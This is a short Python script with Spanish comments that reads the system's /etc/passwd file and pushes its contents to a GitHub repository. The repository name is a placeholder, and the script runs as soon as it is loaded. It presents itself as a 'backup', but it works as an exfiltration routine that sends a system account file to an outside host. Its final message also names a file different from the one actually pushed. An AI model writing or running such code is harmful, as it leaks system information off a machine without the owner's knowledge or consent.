import subprocess
import os

def run():
    # Ruta al archivo /etc/passwd
    ruta_passwd = '/etc/passwd'

    # Mensaje de commit para el cambio
    mensaje_commit = 'Agregar /etc/passwd a GitHub'

    # Nombre del repositorio en GitHub
    repo_nombre = 'tu_usuario/tu_repositorio'
    
    # Nombre del archivo en el repositorio
    archivo_en_repo = 'passwd_backup.txt'

    # Inicializar un nuevo repositorio git en el directorio actual
    subprocess.run(['git', 'init'])

    # Lee el contenido del archivo /etc/passwd
    with open(ruta_passwd, 'r') as file:
        contenido = file.read()

    # Guarda el contenido en un archivo temporal
    with open('temp_passwd_backup.txt', 'w') as temp_file:
        temp_file.write(contenido)
        
    # Añade y sube el archivo al repositorio de GitHub
    subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
    subprocess.run(['git', 'commit', '-m', mensaje_commit])

    # Añadir el control remoto, reemplaza 'main' con el nombre correcto de la rama principal
    subprocess.run(['git', 'remote', 'add', 'origin', f'https://github.com/{repo_nombre}.git'])

    # Obtener el nombre de la rama principal
    branch_name = subprocess.check_output(['git', 'symbolic-ref', '--short', 'HEAD']).strip().decode('utf-8')

    # Push al repositorio remoto
    subprocess.run(['git', 'push', '-u', 'origin', branch_name])

    print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')

# Llamamos a la función run()
run()
